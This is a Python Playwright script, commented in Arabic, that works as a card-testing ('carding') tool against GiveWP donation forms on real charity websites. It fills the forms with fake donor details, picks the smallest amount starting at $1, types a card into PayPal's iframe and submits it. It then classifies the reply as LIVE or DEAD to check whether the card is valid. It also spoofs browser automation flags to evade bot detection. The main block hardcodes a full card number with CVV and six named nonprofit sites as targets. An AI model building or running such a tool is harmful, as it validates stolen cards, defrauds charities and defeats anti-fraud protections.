#!/usr/bin/env python3
"""
Playwright GiveWP Engine v12 — Ultimate Edition
================================================
محرك فحص شامل لمواقع GiveWP PayPal Commerce
- بيفتح متصفح حقيقي
- بيملأ كل أنواع الفورم
- بيختار المبلغ بأي طريقة
- بيتعامل مع PayPal iframe
- بيتجاوز Cloudflare/antibot
- بيصور screenshots للتشخيص
"""

import asyncio
import os
import re
import time
import json
import random
import base64
import uuid
from datetime import datetime
from pathlib import Path

from playwright.async_api import async_playwright, TimeoutError as PWTimeout, Error as PWError


# ═══════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
]

AMOUNTS_TO_TRY = ['1', '2', '3', '5', '10', '20', '25', '50', '100']

FIRST_NAMES = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph']
LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis']
STREETS = ['123 Main Street', '456 Oak Avenue', '789 Pine Road', '321 Elm Boulevard']
CITIES = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix']
STATES = ['NY', 'CA', 'IL', 'TX', 'AZ']
ZIPS = ['10001', '90001', '60601', '77001', '85001']

# ═══════════════════════════════════════════════════════════════════════
# RESPONSE CLASSIFIER
# ═══════════════════════════════════════════════════════════════════════

class Classifier:
    """يصنّف الردود من PayPal والموقع"""
    
    LIVE_KEYWORDS = {
        'CHARGE_SUCCESS': ['success', 'approved', 'charged', 'completed', 'thank you'],
        'INSUFFICIENT_FUNDS': ['insufficient', 'not enough', 'nsf'],
        'DO_NOT_HONOR': ['do not honor'],
        'CVV_FAILURE': ['cvv', 'security code', 'cvc'],
        'EXPIRED_CARD': ['expired', 'expiration'],
        'SUSPECTED_FRAUD': ['fraud', 'suspicious'],
        'DECLINED': ['declined', 'denied', 'rejected', 'refused'],
        'ACCOUNT_CLOSED': ['closed', 'locked'],
        'ORDER_NOT_APPROVED': ['order_not_approved', 'not yet approved'],
        '3DS_REQUIRED': ['authentication', '3d secure', 'verify'],
        'PAYER_CANNOT_PAY': ['cannot pay', 'payer cannot'],
        'INVALID_CARD': ['invalid card', 'invalid number'],
        'GENERIC_DECLINE': ['generic decline'],
        'RESTRICTED': ['restricted', 'blocked', 'inactive'],
        'COMPLIANCE_VIOLATION': ['compliance'],
        'TRANSACTION_NOT_PERMITTED': ['not permitted'],
        'PAYMENT_DENIED': ['payment denied'],
        'SECURITY_VIOLATION': ['security violation'],
        'LIMIT_EXCEEDED': ['limit exceeded', 'attempts exceed'],
    }
    
    DEAD_KEYWORDS = {
        'CLOUDFLARE': ['just a moment', 'verifying', 'checking your browser', 'cf-browser'],
        'ANTIBOT': ['captcha', 'not a robot', 'compruebe que no es'],
        'NO_FORM': ['form not published', 'no form', 'form is not available'],
        'GATEWAY_DISABLED': ['gateway is not enabled', 'payment gateway is not'],
        'JS_CONFLICT': ['javascript conflict', 'connection between this site'],
        'FORM_INCOMPLETE': ['billing address', 'required field', 'is required'],
        'CREATE_FAILED': ['create order failed', 'could not create'],
        'MINIMUM_NOT_MET': ['minimum donation', 'amount is invalid'],
    }
    
    @classmethod
    def classify(cls, text):
        if not text: return ('DEAD', 'EMPTY')
        low = text.lower()
        
        # DEAD first
        for code, kws in cls.DEAD_KEYWORDS.items():
            for kw in kws:
                if kw in low:
                    return ('DEAD', code)
        
        # LIVE codes
        for code, kws in cls.LIVE_KEYWORDS.items():
            for kw in kws:
                if kw in low:
                    return ('LIVE', code)
        
        return ('UNKNOWN', 'UNKNOWN')


# ═══════════════════════════════════════════════════════════════════════
# MAIN ENGINE
# ═══════════════════════════════════════════════════════════════════════

class PlaywrightEngine:
    """v12 — المحرك الشامل"""
    
    def __init__(self, url, card, verbose=True, screenshots=False):
        self.url = url
        self.card = card
        self.verbose = verbose
        self.screenshots = screenshots
        self.debug = {
            'url': url,
            'steps': [],
            'network': [],
            'paypal_responses': [],
            'screenshots': [],
            'form_found': None,
            'amount_selected': None,
            'paypal_frame': False,
            'card_filled': False,
        }
    
    def log(self, msg):
        if self.verbose:
            print(msg)
        self.debug['steps'].append(msg)
    
    async def _screenshot(self, page, name):
        if not self.screenshots:
            return
        try:
            ts = int(time.time())
            path = f'/tmp/pw_{name}_{ts}.png'
            await page.screenshot(path=path, full_page=False)
            self.debug['screenshots'].append(path)
            self.log(f'      📸 {path}')
        except:
            pass
    
    async def _on_response(self, response):
        """يسجل كل responses اللي تهمنا"""
        try:
            url = response.url
            if any(k in url for k in ['create_order', 'confirm-payment', 'approve_order',
                                       'checkout/orders', 'paypal.com/v2']):
                body = ''
                try:
                    body = await response.text()
                except:
                    pass
                self.debug['network'].append({
                    'url': url[:150],
                    'status': response.status,
                    'body': body[:800],
                })
                if 'paypal.com' in url or 'confirm-payment' in url:
                    self.debug['paypal_responses'].append({
                        'status': response.status,
                        'body': body[:500],
                    })
        except:
            pass
    
    # ═══════════════════════════════════════════════════════════════
    # MAIN RUN
    # ═══════════════════════════════════════════════════════════════
    
    async def run(self):
        async with async_playwright() as p:
            self.log('  🚀 launching chromium...')
            
            try:
                browser = await p.chromium.launch(
                    headless=True,
                    args=[
                        '--no-sandbox',
                        '--disable-setuid-sandbox',
                        '--disable-blink-features=AutomationControlled',
                        '--disable-dev-shm-usage',
                        '--disable-gpu',
                        '--no-first-run',
                        '--no-zygote',
                        '--disable-features=IsolateOrigins,site-per-process',
                        '--disable-web-security',
                        '--ignore-certificate-errors',
                        '--allow-running-insecure-content',
                    ]
                )
            except Exception as e:
                return self._err(f'LAUNCH_FAILED: {e}')
            
            try:
                context = await browser.new_context(
                    user_agent=random.choice(USER_AGENTS),
                    viewport={'width': 1366, 'height': 900},
                    locale='en-US',
                    timezone_id='America/New_York',
                    ignore_https_errors=True,
                    java_script_enabled=True,
                    extra_http_headers={
                        'Accept-Language': 'en-US,en;q=0.9',
                        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                    }
                )
                # تجاوز كشف automation
                await context.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                    Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
                    Object.defineProperty(navigator, 'languages', {get: () => ['en-US','en']});
                    window.chrome = {runtime: {}};
                """)
                
                page = await context.new_page()
                page.on('response', self._on_response)
                
                result = await self._execute(page, browser, context)
                return result
            finally:
                try:
                    await browser.close()
                except:
                    pass
    
    def _err(self, msg):
        return {'status': 'DEAD', 'code': msg[:100], 'raw': msg[:300], 'debug': self.debug}
    
    async def _execute(self, page, browser, context):
        # ═══ Stage 1: Load page ═══
        self.log(f'\n  [1] Loading {self.url}')
        try:
            await page.goto(self.url, wait_until='domcontentloaded', timeout=45000)
        except PWTimeout:
            self.log('      ⚠️ timeout, continuing...')
        except Exception as e:
            return self._err(f'GOTO_FAILED: {e}')
        
        await page.wait_for_timeout(3000)
        await self._screenshot(page, '01_loaded')
        
        # ═══ Stage 2: Cloudflare/antibot check ═══
        self.log('  [2] Checking cloudflare/antibot...')
        html = await page.content()
        if any(x in html.lower() for x in ['just a moment', 'verifying you are',
                                            'checking your browser', 'cf-browser-verification']):
            self.log('      ⚠️ Cloudflare — waiting up to 20s...')
            for i in range(4):
                await page.wait_for_timeout(5000)
                html = await page.content()
                if 'just a moment' not in html.lower() and 'verifying' not in html.lower():
                    self.log(f'      ✅ passed after {(i+1)*5}s')
                    break
            else:
                return self._err('CLOUDFLARE_BLOCKED')
        
        if any(x in html.lower() for x in ['captcha', 'not a robot', 'g-recaptcha', 'hcaptcha']):
            self.log('      ⚠️ captcha detected')
            return self._err('CAPTCHA_BLOCKED')
        
        # ═══ Stage 3: Find form ═══
        self.log('  [3] Finding GiveWP form...')
        form_info = await self._find_form(page)
        if not form_info:
            return self._err('NO_FORM')
        self.debug['form_found'] = form_info['type']
        self.log(f'      ✅ form: {form_info["type"]}')
        
        # ═══ Stage 4: Fill personal data ═══
        self.log('  [4] Filling personal data...')
        await self._fill_personal(page)
        
        # ═══ Stage 5: Select amount ═══
        self.log('  [5] Selecting amount...')
        amount = await self._select_amount_smart(page)
        self.debug['amount_selected'] = amount
        if amount:
            self.log(f'      ✅ selected ${amount}')
        else:
            self.log(f'      ⚠️ could not select amount, trying anyway')
        
        # ═══ Stage 6: Fill billing ═══
        self.log('  [6] Filling billing (if required)...')
        await self._fill_billing(page)
        
        # ═══ Stage 7: Accept terms ═══
        self.log('  [7] Accepting terms...')
        await self._check_terms(page)
        
        # ═══ Stage 8: Click donate ═══
        self.log('  [8] Clicking donate...')
        clicked = await self._click_donate(page)
        if not clicked:
            return self._err('CLICK_FAILED')
        
        await page.wait_for_timeout(3000)
        await self._screenshot(page, '02_after_click')
        
        # ═══ Stage 9: Wait for PayPal or error ═══
        self.log('  [9] Waiting for PayPal or error...')
        paypal = await self._wait_paypal(page, timeout=20)
        
        # لو مفيش PayPal، اقرأ الرد من الصفحة
        if not paypal:
            page_text = await page.inner_text('body')
            status, code = Classifier.classify(page_text)
            if status == 'DEAD':
                return {'status': 'DEAD', 'code': code, 'raw': page_text[:400], 'debug': self.debug}
            # ممكن يكون راح على صفحة شكر
            if 'thank' in page_text.lower() or 'success' in page_text.lower():
                return {'status': 'LIVE', 'code': 'CHARGE_SUCCESS', 'raw': page_text[:400], 'debug': self.debug}
            return self._err(f'NO_PAYPAL: {page_text[:100]}')
        
        self.debug['paypal_frame'] = True
        self.log('      ✅ PayPal frame found')
        
        # ═══ Stage 10: Fill card ═══
        self.log('  [10] Filling card in PayPal...')
        card_result = await self._fill_card_paypal(paypal, page)
        self.debug['card_filled'] = card_result.get('filled', False)
        
        if not card_result.get('filled'):
            return {'status': 'DEAD', 'code': 'CARD_FILL_FAILED',
                    'raw': card_result.get('error', ''), 'debug': self.debug}
        
        # ═══ Stage 11: Submit payment ═══
        self.log('  [11] Submitting payment...')
        await self._submit_payment(paypal, page)
        
        # ═══ Stage 12: Read final response ═══
        self.log('  [12] Reading response...')
        await page.wait_for_timeout(5000)
        await self._screenshot(page, '03_final')
        
        final = await self._read_final_response(page, paypal)
        final['debug'] = self.debug
        return final
    
    # ═══════════════════════════════════════════════════════════════
    # FORM DETECTION
    # ═══════════════════════════════════════════════════════════════
    
    async def _find_form(self, page):
        """يدور على الفورم بـ 10 selectors مختلفة"""
        selectors = [
            ('givewp_classic', 'form.give-form'),
            ('givewp_id', 'form[id*="give-form"]'),
            ('givewp_wrap', '.give-form-wrap form'),
            ('givewp_any', 'form[class*="give"]'),
            ('givewp_input', 'input[name="give-amount"]'),
            ('paypal_form', 'form[class*="paypal"]'),
            ('generic', 'form'),
        ]
        for ftype, sel in selectors:
            try:
                loc = page.locator(sel).first
                if await loc.count() > 0:
                    # تأكد إن الفورم فيه input على الأقل
                    inputs = await page.locator(f'{sel} input').count()
                    if inputs > 0 or ftype == 'givewp_input':
                        return {'type': ftype, 'selector': sel}
            except:
                continue
        
        # آخر محاولة: ابحث في iframe
        for frame in page.frames:
            if frame == page.main_frame:
                continue
            try:
                if await frame.locator('input[name="give-amount"], form.give-form').count() > 0:
                    return {'type': 'iframe', 'frame': frame}
            except:
                continue
        
        return None
    
    # ═══════════════════════════════════════════════════════════════
    # FILL PERSONAL
    # ═══════════════════════════════════════════════════════════════
    
    async def _fill_personal(self, page):
        """يملأ الاسم والإيميل والإيميل الثاني"""
        first = random.choice(FIRST_NAMES)
        last = random.choice(LAST_NAMES)
        email = f'user{int(time.time()*1000)%999999}@gmail.com'
        
        fills = [
            ('input[name="give_first"]', first),
            ('input[name="give_last"]', last),
            ('input[name="give_email"]', email),
            ('input[name*="first_name"]', first),
            ('input[name*="last_name"]', last),
            ('input[type="email"]', email),
            ('input[name*="email"]', email),
            ('input[id*="first"]', first),
            ('input[id*="last"]', last),
        ]
        
        for sel, val in fills:
            try:
                loc = page.locator(sel).first
                if await loc.count() > 0:
                    if await loc.is_visible(timeout=1000):
                        await loc.fill(val, timeout=2000)
            except:
                continue
    
    # ═══════════════════════════════════════════════════════════════
    # SELECT AMOUNT — 8 طرق
    # ═══════════════════════════════════════════════════════════════
    
    async def _select_amount_smart(self, page):
        """يختار المبلغ بـ 8 طرق، بيبدأ من 1$"""
        
        for amt in AMOUNTS_TO_TRY:
            result = await self._try_select_amount(page, amt)
            if result:
                return result
        return None
    
    async def _try_select_amount(self, page, amt):
        """يحاول يختار مبلغ معين بـ 8 طرق"""
        
        # ─── 1. input[name="give-amount"] مباشر ───
        try:
            inp = page.locator('input[name="give-amount"]').first
            if await inp.count() > 0 and await inp.is_visible(timeout=500):
                await inp.click(timeout=1000)
                await inp.fill('', timeout=1000)
                await inp.type(amt, delay=50, timeout=2000)
                await page.wait_for_timeout(300)
                return amt
        except:
            pass
        
        # ─── 2. give-custom-amount input ───
        try:
            inp = page.locator('input[name="give-custom-amount"], input.give-custom-amount, input[id*="custom-amount"]').first
            if await inp.count() > 0 and await inp.is_visible(timeout=500):
                await inp.fill(amt, timeout=2000)
                return amt
        except:
            pass
        
        # ─── 3. زر/button بـ data-price ───
        for val in [amt, f'{amt}.00', f'{amt}.0']:
            try:
                btn = page.locator(f'[data-price="{val}"]').first
                if await btn.count() > 0:
                    await btn.scroll_into_view_if_needed(timeout=2000)
                    await btn.click(timeout=3000)
                    return amt
            except:
                pass
        
        # ─── 4. radio input ───
        for val in [amt, f'{amt}.00']:
            try:
                radio = page.locator(f'input[type="radio"][value="{val}"]').first
                if await radio.count() > 0:
                    await radio.check(timeout=3000)
                    return amt
            except:
                pass
        
        # ─── 5. زر نصه $amt ───
        try:
            btn = page.get_by_role('button', name=re.compile(rf'^\${amt}(\.00)?$')).first
            if await btn.count() > 0:
                await btn.click(timeout=3000)
                return amt
        except:
            pass
        
        # ─── 6. select option ───
        try:
            for sel_name in ['select[name*="amount"]', 'select[name="give-amount"]',
                            'select.give-amount', 'select[id*="amount"]']:
                sel = page.locator(sel_name).first
                if await sel.count() > 0:
                    try:
                        await sel.select_option(amt, timeout=2000)
                        return amt
                    except:
                        try:
                            await sel.select_option(f'{amt}.00', timeout=2000)
                            return amt
                        except:
                            pass
        except:
            pass
        
        # ─── 7. link نصه $amt ───
        try:
            link = page.get_by_role('link', name=re.compile(rf'^\${amt}(\.00)?$')).first
            if await link.count() > 0:
                await link.click(timeout=3000)
                return amt
        except:
            pass
        
        # ─── 8. li/div clickable بـ data-price ───
        try:
            el = page.locator(f'.give-donation-level-btn[data-price="{amt}"], li[data-price="{amt}"], div[data-price="{amt}"]').first
            if await el.count() > 0:
                await el.click(timeout=3000)
                return amt
        except:
            pass
        
        return None
    
    # ═══════════════════════════════════════════════════════════════
    # FILL BILLING — مهم للمواقع اللي بتطلبه (svdpvenicefl)
    # ═══════════════════════════════════════════════════════════════
    
    async def _fill_billing(self, page):
        """يملأ billing address لو موجود"""
        first = random.choice(FIRST_NAMES)
        last = random.choice(LAST_NAMES)
        street = random.choice(STREETS)
        city = random.choice(CITIES)
        state = random.choice(STATES)
        zipcode = random.choice(ZIPS)
        
        billing = [
            ('input[name*="billing"][name*="first"]', first),
            ('input[name*="billing"][name*="last"]', last),
            ('input[name*="address"]', street),
            ('input[name*="street"]', street),
            ('input[name*="city"]', city),
            ('input[name*="state"]', state),
            ('input[name*="zip"]', zipcode),
            ('input[name*="postal"]', zipcode),
            ('input[name*="phone"]', '5551234567'),
        ]
        
        for sel, val in billing:
            try:
                loc = page.locator(sel).first
                if await loc.count() > 0 and await loc.is_visible(timeout=500):
                    tag = await loc.evaluate('el => el.tagName.toLowerCase()')
                    if tag == 'select':
                        try:
                            await loc.select_option(val, timeout=1000)
                        except:
                            try:
                                await loc.select_option(index=1, timeout=1000)
                            except:
                                pass
                    else:
                        await loc.fill(val, timeout=1500)
            except:
                continue
    
    # ═══════════════════════════════════════════════════════════════
    # TERMS
    # ═══════════════════════════════════════════════════════════════
    
    async def _check_terms(self, page):
        """يوافق على الشروط"""
        sels = [
            'input[type="checkbox"][name*="terms"]',
            'input[type="checkbox"][name*="agree"]',
            'input[type="checkbox"][name*="condition"]',
            'input[type="checkbox"][name*="accept"]',
            'input.give_agree_to_terms',
        ]
        for sel in sels:
            try:
                cbs = await page.locator(sel).all()
                for cb in cbs:
                    try:
                        if not await cb.is_checked():
                            await cb.check(timeout=1000, force=True)
                    except:
                        try:
                            await cb.click(timeout=1000, force=True)
                        except:
                            pass
            except:
                continue
    
    # ═══════════════════════════════════════════════════════════════
    # CLICK DONATE
    # ═══════════════════════════════════════════════════════════════
    
    async def _click_donate(self, page):
        """يضغط زر التبرع — 8 محاولات"""
        sels = [
            'button.give-submit',
            'input.give-submit',
            'button[type="submit"][class*="give"]',
            'input[type="submit"][value*="Donate" i]',
            'button:has-text("Donate Now")',
            'button:has-text("Donate")',
            'button:has-text("Give Now")',
            'button:has-text("Give")',
            'button:has-text("Submit")',
            'button[type="submit"]',
            'input[type="submit"]',
        ]
        for sel in sels:
            try:
                btn = page.locator(sel).first
                if await btn.count() > 0 and await btn.is_visible(timeout=800):
                    await btn.scroll_into_view_if_needed(timeout=2000)
                    await page.wait_for_timeout(300)
                    try:
                        await btn.click(timeout=5000)
                    except:
                        await btn.click(timeout=5000, force=True)
                    self.log(f'      ✅ clicked: {sel}')
                    return True
            except:
                continue
        return False
    
    # ═══════════════════════════════════════════════════════════════
    # WAIT PAYPAL
    # ═══════════════════════════════════════════════════════════════
    
    async def _wait_paypal(self, page, timeout=20):
        """ينتظر PayPal iframe أو card form"""
        iterations = timeout * 2  # كل 0.5s
        for i in range(iterations):
            # 1. ابحث في الفريمات
            for frame in page.frames:
                if frame == page.main_frame:
                    continue
                furl = frame.url.lower()
                if any(k in furl for k in ['paypal', 'braintree', 'card-fields', 'hosted-fields']):
                    try:
                        cnt = await frame.locator('input').count()
                        if cnt > 0:
                            return frame
                    except:
                        continue
            
            # 2. ابحث عن iframe في الصفحة
            try:
                iframes = await page.locator('iframe').all()
                for iframe in iframes:
                    try:
                        src = await iframe.get_attribute('src') or ''
                        title = await iframe.get_attribute('title') or ''
                        if any(k in (src + title).lower() for k in ['paypal', 'braintree', 'card']):
                            fr = await iframe.content_frame()
                            if fr:
                                try:
                                    cnt = await fr.locator('input').count()
                                    if cnt > 0:
                                        return fr
                                except:
                                    pass
                    except:
                        continue
            except:
                pass
            
            # 3. ابحث عن card form في الصفحة الرئيسية (بعض المواقع inline)
            try:
                card = page.locator('input[autocomplete="cc-number"], input[name*="cardnumber"], input[name*="card-number"]').first
                if await card.count() > 0:
                    return page  # main page
            except:
                pass
            
            await page.wait_for_timeout(500)
        
        return None
    
    # ═══════════════════════════════════════════════════════════════
    # FILL CARD
    # ═══════════════════════════════════════════════════════════════
    
    async def _fill_card_paypal(self, frame, page):
        """يملأ الكارت في PayPal — 10 محاولات لكل حقل"""
        try:
            n, mm, yy, cvc = self.card.split('|')
            mm = mm.zfill(2)
            if len(yy) == 4:
                yy = yy[2:]
            
            await asyncio.sleep(2)
            
            # ─── email (PayPal بيطلبه أحياناً) ───
            for sel in ['input[type="email"]', 'input[name*="email"]', 'input[id*="email"]']:
                try:
                    loc = frame.locator(sel).first
                    if await loc.count() > 0 and await loc.is_visible(timeout=500):
                        await loc.fill(f'u{int(time.time()*1000)%999999}@gmail.com', timeout=2000)
                        break
                except:
                    continue
            
            # ─── Card number ───
            card_filled = False
            for sel in [
                'input#credit-card-number',
                'input[name="cardnumber"]',
                'input[name="card-number"]',
                'input[name="cardNumber"]',
                'input[autocomplete="cc-number"]',
                'input[placeholder*="Card number" i]',
                'input[placeholder*="Card Number" i]',
                'input[placeholder*="card" i][type="tel"]',
                'input[type="tel"][name*="card"]',
                'input[data-testid*="card"]',
            ]:
                try:
                    loc = frame.locator(sel).first
                    if await loc.count() > 0:
                        await loc.click(timeout=2000)
                        await loc.fill('', timeout=1000)
                        # نكتب حرف حرف
                        await loc.type(n, delay=30, timeout=8000)
                        card_filled = True
                        self.log(f'      ✅ card number')
                        break
                except:
                    continue
            
            if not card_filled:
                return {'filled': False, 'error': 'CARD_NUMBER_NOT_FOUND'}
            
            await asyncio.sleep(0.5)
            
            # ─── Expiry ───
            for sel in [
                'input#expiration-date',
                'input[name="exp"]',
                'input[name="expiry"]',
                'input[name="expiration"]',
                'input[autocomplete="cc-exp"]',
                'input[placeholder*="MM / YY" i]',
                'input[placeholder*="MM/YY" i]',
                'input[placeholder*="expiration" i]',
                'input[placeholder*="expiry" i]',
                'input[name*="expire"]',
            ]:
                try:
                    loc = frame.locator(sel).first
                    if await loc.count() > 0:
                        await loc.click(timeout=1500)
                        await loc.fill('', timeout=1000)
                        await loc.type(f'{mm}{yy}', delay=30, timeout=3000)
                        self.log(f'      ✅ expiry')
                        break
                except:
                    continue
            
            # ─── CVC ───
            for sel in [
                'input#cvv',
                'input#cvc',
                'input[name="cvv"]',
                'input[name="cvc"]',
                'input[name="securityCode"]',
                'input[autocomplete="cc-csc"]',
                'input[placeholder*="CVV" i]',
                'input[placeholder*="CVC" i]',
                'input[placeholder*="security code" i]',
            ]:
                try:
                    loc = frame.locator(sel).first
                    if await loc.count() > 0:
                        await loc.click(timeout=1500)
                        await loc.fill('', timeout=1000)
                        await loc.type(cvc, delay=30, timeout=3000)
                        self.log(f'      ✅ cvc')
                        break
                except:
                    continue
            
            await asyncio.sleep(0.5)
            return {'filled': True}
        except Exception as e:
            return {'filled': False, 'error': str(e)[:200]}
    
    # ═══════════════════════════════════════════════════════════════
    # SUBMIT PAYMENT
    # ═══════════════════════════════════════════════════════════════
    
    async def _submit_payment(self, frame, page):
        """يضغط زر الدفع في PayPal"""
        sels = [
            'button:has-text("Pay")',
            'button:has-text("Continue")',
            'button:has-text("Complete")',
            'button:has-text("Submit")',
            'button[type="submit"]',
            'button#btn-pay',
            'button[id*="pay"]',
            'button[data-testid*="pay"]',
        ]
        for sel in sels:
            try:
                btn = frame.locator(sel).first
                if await btn.count() > 0 and await btn.is_visible(timeout=800):
                    await btn.click(timeout=5000)
                    self.log(f'      ✅ payment submitted')
                    return True
            except:
                continue
        return False
    
    # ═══════════════════════════════════════════════════════════════
    # READ FINAL RESPONSE
    # ═══════════════════════════════════════════════════════════════
    
    async def _read_final_response(self, page, frame):
        """يقرأ الرد النهائي من الصفحة + network"""
        
        # 1. جرّب من network logs أولاً
        for resp in self.debug['paypal_responses']:
            text = resp.get('body', '')
            status, code = Classifier.classify(text)
            if status == 'LIVE' or code not in ('UNKNOWN', 'EMPTY'):
                return {
                    'status': status,
                    'code': code,
                    'raw': text[:300],
                }
        
        # 2. اقرأ من الصفحة
        texts = []
        try:
            if frame:
                texts.append(await frame.inner_text('body'))
        except:
            pass
        
        try:
            texts.append(await page.inner_text('body'))
        except:
            pass
        
        for text in texts:
            if not text:
                continue
            status, code = Classifier.classify(text)
            if status == 'LIVE':
                return {'status': 'LIVE', 'code': code, 'raw': text[:300]}
        
        # 3. ابحث عن alert/error محدد
        try:
            alerts = await page.locator('[role="alert"], .give_error, .error, .alert').all()
            for alert in alerts:
                t = await alert.inner_text()
                if t:
                    status, code = Classifier.classify(t)
                    return {'status': status, 'code': code, 'raw': t[:300]}
        except:
            pass
        
        # 4. لو كل حاجة فشلت، ارجع UNKNOWN
        return {'status': 'UNKNOWN', 'code': 'NO_RESPONSE',
                'raw': (texts[0] if texts else '')[:300]}


# ═══════════════════════════════════════════════════════════════════════
# RUNNER
# ═══════════════════════════════════════════════════════════════════════

async def test_sites(card, sites):
    print('=' * 70)
    print('🔥 Playwright GiveWP Engine v12')
    print('=' * 70)
    print(f'💳 {card}')
    print(f'🌐 {len(sites)} sites')
    print('=' * 70)
    
    summary = []
    for name, url in sites:
        print(f'\n{"━" * 70}\n🌐 {name}\n{"━" * 70}')
        start = time.time()
        try:
            eng = PlaywrightEngine(url, card, verbose=True, screenshots=False)
            result = await eng.run()
            elapsed = time.time() - start
            icon = '✅' if result['status'] == 'LIVE' else '❌'
            print(f'\n  {icon} {result["status"]} | {result["code"]} ({elapsed:.1f}s)')
            if result.get('raw'):
                print(f'     raw: {result["raw"][:200]}')
            print(f'     amount={result["debug"].get("amount_selected")} '
                  f'| paypal={result["debug"].get("paypal_frame")} '
                  f'| card={result["debug"].get("card_filled")}')
            summary.append((name, result['status'], result['code'], elapsed))
        except Exception as e:
            elapsed = time.time() - start
            print(f'  ❌ EXCEPTION: {str(e)[:200]}')
            summary.append((name, 'ERROR', str(e)[:60], elapsed))
        await asyncio.sleep(2)
    
    print(f'\n{"=" * 70}\n📊 SUMMARY\n{"=" * 70}')
    for n, s, c, t in summary:
        icon = '✅' if s == 'LIVE' else '❌'
        print(f'{icon} {n:<22} | {s:<6} | {c:<25} | {t:.1f}s')


# ═══════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════

if __name__ == '__main__':
    CARD = '5104040287872188|12|2027|951'
    
    SITES = [
        ('dandelions',      'https://dandelionsmontessori.org/give/15767517?giveDonationFormInIframe=1'),
        ('svdpvenicefl',    'https://svdpvenicefl.org/donations/donations/'),
        ('embracingpurpose','https://embracingpurpose.org/give-now/'),
        ('violin',          'https://violin.org/giving/'),
        ('veritascc',       'https://www.veritascc.org/donate'),
        ('abundantearth',   'https://abundantearthfoundation.org/donations/ancientcacao/'),
    ]
    
    try:
        asyncio.run(test_sites(CARD, SITES))
    except KeyboardInterrupt:
        print('\n⏹️  Interrupted')
    except Exception as e:
        print(f'\n❌ Fatal: {e}')
